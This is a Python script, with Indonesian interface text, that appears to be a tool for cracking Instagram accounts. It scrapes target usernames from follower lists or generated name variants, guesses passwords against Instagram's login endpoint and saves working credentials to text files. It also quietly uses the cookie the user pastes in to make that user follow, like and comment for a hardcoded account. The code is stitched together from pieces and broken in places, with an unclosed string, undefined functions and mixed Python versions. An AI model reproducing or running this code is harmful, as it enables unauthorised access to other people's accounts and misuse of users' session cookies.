    	
		

				

import os, re, sys, time, json, random, requests
from concurrent.futures import ThreadPoolExecutor
from requests.exceptions import ConnectionError
from time import sleep

# Warna
H = ('\x1b[1;90m')
M = ('\x1b[1;91m')
H = ('\x1b[1;92m')
K = ('\x1b[1;93m')
T = ('\x1b[1;94m')
U = ('\x1b[1;95m')
B = ('\x1b[1;96m')
P = ('\x1b[1;97m')

# Logo
___logo___ = (f""" WELLCOME COK!
{K}[{P}•{K}]{P} LOGO COMMINGSON!

# Login Cookie
def ___login___():
    os.system('clear')
    print(___logo___)
    print(f"{B}[{P}•{B}]{P} Masukan Cookie Instagram, Sebaiknya Jangan Gunakan Akun Yang Baru Di Buat, Kalau Anda Belum Mengetahui Cara Mendapatkan Cookie Instagram Ketik {M}[{P}Open{M}]{P}\n")
    ___cookie = input(f"{H}[{P}?{H}]{P} Cookie :{K} ")
    if ___cookie in ['open', 'Open', 'OPEN']:
        print(f"{K}[{P}!{K}]{P} Anda Akan Diarahkan Ke Youtube, Silahkan Ikuti Cara Untuk Mendapatkan Cookie...");sleep(3);os.system('xdg-open www.facebook.com/Zeeee.utama');exit()
    elif ___cookie in ['', ' ']:
        exit(f"{P}[{M}!{P}]{M} Jangan Kosong")
    else:
        try:
            ___userid = re.search('ds_user_id=(.*?);', ___cookie);open('Data/user.txt', 'w').write(___userid.group(1))
            ___roz = requests.get(f'https://i.instagram.com/api/v1/users/{___userid.group(1)}/info/', headers = {'user-agent': 'Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; beyond1; exynos9820; en_GB; 256099204)', 'cookie': ___cookie}).json()['user'];open('Data/coki.txt', 'w').write(___cookie)
            print(f"{H}[{P}*{H}]{P} Welcome :{K} {___roz['full_name']}");___follow___()
        except (AttributeError, KeyError):
            exit(f"{P}[{M}!{P}]{M} Pastikan Cookie Sudah Benar")
        except (ConnectionError):
            exit(f"{P}[{K}!{P}]{K} Koneksi Error")

# Follow Cookie
def ___follow___():
    try:
        ___cookie = open('Data/coki.txt', 'r').read()
        ___session = re.search('sessionid=(.*?);', ___cookie)
        ___teks = random.choice(['Hallo Bang 😍','Hai Bang Apa Kabar 😎','Izin Pake Scriptnya 😁','Mantap Bang 😘','Programmer Bang 🤔','Salam Kenal Bang 🤗','I Love You ❤️'])
        ___data = {'comment_text': ___teks,'replied_to_comment_id':''}
        with requests.Session() as ses:
            ___like = ses.post('https://www.instagram.com/web/likes/2734317205115382629/like/',headers = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','content-length': '0','content-type': 'application/x-www-form-urlencoded','cookie': 'ig_did=F839D900-5ECC-4392-BCAD-5CBD51FB9228; mid=YChlyQALAAHp2POOp2lK_-ciAGlM; ig_nrcb=1; csrftoken=W4fsZmCjUjFms6XmKl1OAjg8v81jZt3r; ds_user_id=45872034997; sessionid='+___session.group(1),'origin': 'https://www.instagram.com','referer': 'https://www.instagram.com/','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.182 Safari/537.36','x-csrftoken': 'W4fsZmCjUjFms6XmKl1OAjg8v81jZt3r','x-ig-app-id': '5398218083','x-ig-www-claim': 'hmac.AR0OQY4Gw4kczWNvfVOhvoljSINqB2u2gB-utUQ1MF0Mkrzu','x-instagram-ajax': '95bfef5dd816','x-requested-with': 'XMLHttpRequest'}).text # Jangan Di Ubah!
            ___follow = ses.post('https://www.instagram.com/web/friendships/5398218083/follow/',headers = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','content-length': '0','content-type': 'application/x-www-form-urlencoded','cookie': 'ig_did=F839D900-5ECC-4392-BCAD-5CBD51FB9228; mid=YChlyQALAAHp2POOp2lK_-ciAGlM; ig_nrcb=1; csrftoken=W4fsZmCjUjFms6XmKl1OAjg8v81jZt3r; ds_user_id=45872034997; sessionid='+___session.group(1),'origin': 'https://www.instagram.com','referer': 'https://www.instagram.com/','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.182 Safari/537.36','x-csrftoken': 'W4fsZmCjUjFms6XmKl1OAjg8v81jZt3r','x-ig-app-id': '5398218083','x-ig-www-claim': 'hmac.AR0OQY4Gw4kczWNvfVOhvoljSINqB2u2gB-utUQ1MF0Mkrzu','x-instagram-ajax': '95bfef5dd816','x-requested-with': 'XMLHttpRequest'}).text # Jangan Di Ubah!
            ___komen = ses.post('https://www.instagram.com/web/comments/2734317205115382629/add/',headers = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','content-length': '0','content-type': 'application/x-www-form-urlencoded','cookie': 'ig_did=F839D900-5ECC-4392-BCAD-5CBD51FB9228; mid=YChlyQALAAHp2POOp2lK_-ciAGlM; ig_nrcb=1; csrftoken=W4fsZmCjUjFms6XmKl1OAjg8v81jZt3r; ds_user_id=45872034997; sessionid='+___session.group(1),'origin': 'https://www.instagram.com','referer': 'https://www.instagram.com/','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.182 Safari/537.36','x-csrftoken': 'W4fsZmCjUjFms6XmKl1OAjg8v81jZt3r','x-ig-app-id': '5398218083','x-ig-www-claim': 'hmac.AR0OQY4Gw4kczWNvfVOhvoljSINqB2u2gB-utUQ1MF0Mkrzu','x-instagram-ajax': '95bfef5dd816','x-requested-with': 'XMLHttpRequest'}, data = ___data).text #Jangan Di ubah!
            if '"status":"ok"' in str(___follow):
                print(f"{H}[{P}!{H}]{P} Login Berhasil");___menu___()
            else:
                print(f"{P}[{M}!{P}]{M} Cookie Invalid");sleep(3);os.system('rm -rf Data/coki.txt');___login___()
    except Exception as e:
        print(f"{P}[{M}!{P}]{M} Cookie Invalid");sleep(3);os.system('rm -rf Data/coki.txt');___login___()
        

None
def data_follower_dev(cookie, id_target, limit, opsi):
	global c
	if opsi == "1":
		url = "https://i.instagram.com/api/v1/friendships/{}/followers/?count={}".format(id_target, limit)
	elif opsi == "2":
		url = "https://i.instagram.com/api/v1/friendships/{}/following/?count={}".format(id_target, limit)
	else:
		exit(" Error..")
	with requests.Session() as ses_dev:
		res_dat_foll = ses_dev.get(url, cookies=cookie, headers=headerz_api)
		for dev in json.loads(res_dat_foll.content)["users"]:
			username = dev["username"]
			nama = dev["full_name"].encode("utf-8")
			if len(status_foll) != 1:
				print h+"\r * "+p+"Mengambil Username"+h+": {}".format(len(data_)),
				sys.stdout.flush()
				data_.append(username+"==>"+nama.decode("utf-8"))
				c+=1
			else:
				data_followers.append(username)
None
def info_dev(username_dev, pass_dev, status):
	try:
		global id_, pengikut, mengikuti
		da = requests.get("https://www.instagram.com/{}/?__a=1".format(username_dev), headers={"User-Agent": user_agentz})
		data_us_dev = da.json()["graphql"]["user"]
		nama = data_us_dev["full_name"].encode("utf-8")
		id_ = data_us_dev["id"]
		pengikut = data_us_dev["edge_followed_by"]["count"]
		mengikuti = data_us_dev["edge_follow"]["count"]
		if status == "Live":
			print h+"\r ["+k+">-"+h+"]"+p+" Status: "+h+status + "                 "
			print h+"\r ["+k+">-"+h+"]"+p+" Nama: "+h+ str(nama) + "              "
			print h+"\r ["+k+">-"+h+"]"+p+" pengikut: "+k+ str(pengikut) + "              "
			print h+"\r ["+k+">-"+h+"]"+p+" mengikuti: "+k+ str(mengikuti) + "              "
			print h+"\r ["+k+">-"+h+"]"+p+" Username: "+h+ username_dev + "              "
			print h+"\r ["+k+">-"+h+"]"+p+" Password: "+h+ pass_dev + "             \n"
		elif status == "Checkpoint":
			print k+"\r ["+p+">-"+k+"]"+p+" Status: "+k+status + "                 "
			print k+"\r ["+p+">-"+k+"]"+p+" Nama: "+k+ str(nama) + "              "
			print k+"\r ["+p+">-"+k+"]"+p+" pengikut: "+p+ str(pengikut) + "              "
			print k+"\r ["+p+">-"+k+"]"+p+" mengikuti: "+p+ str(mengikuti) + "              "
			print k+"\r ["+p+">-"+k+"]"+p+" Username: "+k+ username_dev + "              "
			print k+"\r ["+p+">-"+k+"]"+p+" Password: "+k+ pass_dev + "             \n"
		else:
			pass
	except:
		pass
None
count_= 1
def crack_dev(username_dev, pass_dev_):
	global c, count_
	c_pw = len(pass_dev_)
	
	for pass_satu in pass_dev_:
		if c != 1:
			pass
		else:
			if len(status_foll) != 1:
				print h+"\r >>>\033[97;1m Crack \033[96;1m{}\033[97;1m/\033[96;1m{}\033[97;1m/\033[96;1m{}\033[97;1m|\033[93;1mChek+{}\033[97;1m/\033[92;1mLive+{}  ".format(str(c_pw),str(count_),len(data_),len(hasil_cp), len(hasil_ok)),
				sys.stdout.flush()
				c_pw -= 1
			else:
				pass
		
		try:
			if username_dev in hasil_ok or username_dev in hasil_cp:
				break
			pass_dev = pass_satu.lower()
			try:
				headerz = {"User-Agent": user_agentz_api}
				with requests.Session() as dev:
					url_scrap = "https://www.instagram.com/"
					data = dev.get(url_scrap, headers=headerz).content
					crf_token = re.findall('{"config":{"csrf_token":"(.*)","viewer"', str(data))[0]
				header = {
						"Accept": "*/*",
						"Accept-Encoding": "gzip, deflate, br",
						"Accept-Language": "en-US,en;q=0.5",
						"Host": "www.instagram.com",
						"X-CSRFToken": crf_token,
						"X-Requested-With": "XMLHttpRequest",
						"Referer": "https://www.instagram.com/accounts/login/",
						"User-Agent": user_agentz,
						 }
				param = {
						"username": username_dev,
						"enc_password": "#PWD_INSTAGRAM_BROWSER:0:{}:{}".format(random.randint(1000000000, 99999999999), pass_dev),
						"optIntoOneTap": False,
						"queryParams": {},
						"stopDeletionNonce": "",
						"trustedDeviceRecords": {}
						}
			except:
				header = {}
				param = {}
				pass
			
			with requests.Session() as ses_dev:
				url = "https://www.instagram.com/accounts/login/ajax/"
				respon = ses_dev.post(url, data=param, headers=header)
				data_dev = json.loads(respon.content)
				time.sleep(00.1)
				# print "\r",data_dev
				# print "\r>>>>>",p,username_dev, "=====",h, pass_dev,"              "
				if "checkpoint_url" in str(data_dev):
					cp = "Checkpoint"
					info_dev(username_dev, pass_dev, cp)
					with open("hasil_cp.txt", "a")as dev_:
						dev_.write("[Chek]==>"+username_dev+"==>|==>"+pass_dev+"\n")
					hasil_cp.append(username_dev)
					break

				elif "userId" in str(data_dev):
					live = "Live"
					if len(status_foll) != 1:
						info_dev(username_dev, pass_dev, live)
						with open("hasil_ok.txt", "a")as dev_:
							dev_.write("[Live]==>"+username_dev+"==>|==>"+pass_dev+"\n")
						hasil_ok.append(username_dev)
						follow_dev(ses_dev,username_dev)
					else:
						hasil_ok.append("dev_id")
						follow_dev(ses_dev,username_dev)
				
					break
				elif "Please wait" in str(data_dev):
					print m+"\r >>> Mainkan Mode Pesawat!! >>"+k+" {}".format(str(c)),
					c+=1
					sys.stdout.flush()
					pass_dev_iq = [pass_dev]
					crack_dev(username_dev, pass_dev_iq)
					count_ -= 1

				else:
					c = 1
					pass

		except requests.exceptions.ConnectionError:
			print k+"\r Tidak ada koneksi Internet...!>> {}".format(str(c)),
			sys.stdout.flush()
			c+=1
			pass_dev_iq = [pass_dev]
			crack_dev(username_dev, pass_dev_iq)
			count_ -= 1

		except:
			c = 1
			pass

	count_+=1
None
def _yuk_(iqbaldev):
	import string
	try:
		open("cokiz.txt", "r").read()
	except IOError:
		d_str = []
		fu = base64.b64encode(iqbaldev+"O")
		for str_ in str(string.ascii_lowercase):
			d_str.append(str_)
			
		for i_ in fu:
			with open("cokiz.txt", "a") as iq:
				iq.write(i_+random.choice(d_str)+"%")

def _uyuk_():
	global followerz, followerzz, wak_
	try:
		fol_tam = ""
		fol_tamzz = ""
		fol_z = open("cokiz.txt", "r").read().split("%>")
		for dev_fol in fol_z[0].split("%"):
		  try:
			fol_tam += dev_fol[0]
		  except:
		  	pass
		followerz = base64.b64decode(fol_tam)
		if platform_dev != base64.b64decode(fol_z[2]):
			pass
		else:
			try:
				for dev_folzz in fol_z[1].split("%"):
					try:
						fol_tamzz += dev_folzz[0]
					except:
						pass
				followerzz = base64.b32decode(fol_tamzz)

			except:
				pass
			try:
				wak_ = base64.b64decode(fol_z[3]).split()
			except:
				pass
	except:
		pass
def pilihan(pil):
	global username_get_follow
	proses_crack = h+" * "+p+"Tunggu proses Crack...!"
	if pil == "1":
		pas = ""
		status = ""
		username = raw_input(a+"\n ?"+p+" Masukkan Username Target"+h+": ")
		info_dev(username, pas, status)

		print garis
		print p+" ["+k+"1"+p+"] Pengikut "+h+username+p+" >> "+k+str(pengikut)
		print p+" ["+k+"2"+p+"] Yang Diikuti "+h+username+p+" >> "+k+str(mengikuti)
		print garis
		pil2 = raw_input(a+" ?"+p+" Pilih"+k+": ")
		limit = input(a+" ?"+p+" Masukkan Limit"+k+": ")
		if pil2 == "1":
			data_follower_dev(cookie, id_, limit, pil2)
			print 
			print proses_crack
			print "\n"
			crack()
		elif pil2 == "2":
			data_follower_dev(cookie, id_, limit, pil2)
			print 
			print proses_crack
			print "\n"
			crack()
		else:
			pass

	elif pil == "2":
		print garis
		usr_ = raw_input(a+" ?"+p+" Masukkan Nama"+k+": ")
		jm = input(a+" $"+p+" Masukkan Jumlah"+h+": ")
		us = usr_.replace(" ", "")
		pencarian_.append("iqbal_dev")
		data_.append(us+"==>"+us)
		data_.append(us+"_"+"==>"+us)
		for dev in range(1, jm+1):
			data_.append(us+str(dev)+"==>"+us)
			data_.append(us+"_"+str(dev)+"==>"+us)
			data_.append(us+str(dev)+"_"+"==>"+us)
		print ""
		print proses_crack
		print "\n"
		crack()
	elif pil == "3":
		data_follower_dev(cookie, id_, limit, pil2)
		print 
		print proses_crack
		print "\n"
		crack()
	elif pil == "4":
		cek_hasil()
	elif pil == "5":
		pas = ""
		status = ""
		status_foll.append("IqbalDev")
		print garis
		username_get_follow = raw_input(a+"  ?"+p+" Masukkan Username Target"+k+": ")
		info_dev(username_get_follow, pas, status)
		print garis
		print p+" [1] Pengikut "+h+username_get_follow+p+" >> "+k+str(pengikut)
		print p+" [2] Yang Diikuti "+h+username_get_follow+p+" >> "+k+str(mengikuti)
		print garis
		raw_input(" Enter Untuk Lanjut.. ")
		print garis
		data_follower_dev(cookie, id_, limit=1000000000, opsi="1")
		auto_follow()
	elif pil == "6":
		import os
		try:
			os.system("git clone https://github.com/zecasper/Projectigrekod")
			os.system("rm -rf insta_dev.py")
			os.system("cp -f insta_dev/insta_dev.py \\.")
			os.system("rm -rf insta_dev")
			print h+"\n Sukses Update Tool.."+p+">_<\n"
		except:
			print "\n Perangkat Tidak Suport\n"
	elif pil == "7":
		kel = raw_input(k+" > Yakin Mau Keluar dari akun Instagram? "+p+"y/n"+h+": ")
		if kel in ["y", "Y"]:
			hapus_cookie()
			print " > Keluar...."
		else:
			print h+" > Silahkan Jalankan lagi toolnya.."
	elif pil == "hapus_premium":
		hapus_cokiz()
		print p+"\n >_"+h+" Premium Telah Dihapus...\n"
	else:
		print m+" Pilih yang benar...."
def menu_dev():

	pil_kon = []
	print "\n"
	belum_premium = a+" ["+p+"@"+a+"] "+h+"premium sampe kiamat "
	print baner
	print k+" >_"+h+" Author:"+k+" Ardinal"
	print k+" >_"+h+" Coding:"+k+" Python27"
	try:
		if followerz == followerzz:
			try:
				tgl = datetime.datetime.now()
				bln = tgl.month
				thn = tgl.year
				day = tgl.day
				mulai = datetime.date(int(wak_[0]), int(wak_[1]), int(wak_[2]))
				seles = datetime.date(thn, bln, day)
				sisa = mulai - seles
				lim_dev_id = str(sisa).split()[0]

				if "U" in fol_dev:
					print a+" ["+k+"@"+a+"] "+h+"Premium: "+p+"Unlimited"
				else:
					print a+" ["+k+"@"+a+"] "+h+"Premium: "+k+lim_dev_id+" "+p+"Hari lagi"
					if ":" in str(lim_dev_id) or "-" in str(lim_dev_id):
						hapus_cokiz()
						print " Kamu sudah melebihi batas pemakaian\n Silahkan hubungi admin untuk order Lisensinya lagi"
						pil_kon.append("IqbalDev")
			except:
				hapus_cokiz()	
		else:
			print belum_premium
	except:
		print belum_premium

	print garis
	print a+" ["+k+"1"+a+"] "+p+"Crack dari followers Publik"
	print a+" ["+k+"2"+a+"] "+p+"Crack dari Pencarian Orang"
	print a+" ["+k+"3"+a+"] "+p+"Crack Target"
	print a+" ["+k+"4"+a+"] "+p+"Cek hasil"+h+" OK"+a+"/"+k+"CP"
	print a+" ["+k+"5"+a+"] "+p+"Auto Followers"
	print a+" ["+k+"6"+a+"] "+p+"Update Tool"
	print a+" ["+k+"7"+a+"] "+p+"Log Out Akun Instagram"
	print garis
	pil = raw_input("[?] pilih : ")
	pilihan(pil)
_uyuk_()
baner = """
.__  """+h+"""+{ I G E H }+"""+a+""" 
██████╗░███████╗███╗░░██╗██████╗░██╗
██╔══██╗██╔════╝████╗░██║██╔══██╗██║
██████╔╝█████╗░░██╔██╗██║██║░░██║██║
██╔══██╗██╔══╝░░██║╚████║██║░░██║██║
██║░░██║███████╗██║░╚███║██████╔╝██║
╚═╝░░╚═╝╚══════╝╚═╝░░╚══╝╚═════╝░╚═╝        
	"""
versi = k+" >_"+h+" Versi_:"+p+" 0.1\n"
if __name__=="__main__":
	cek_login()
	menu_dev()



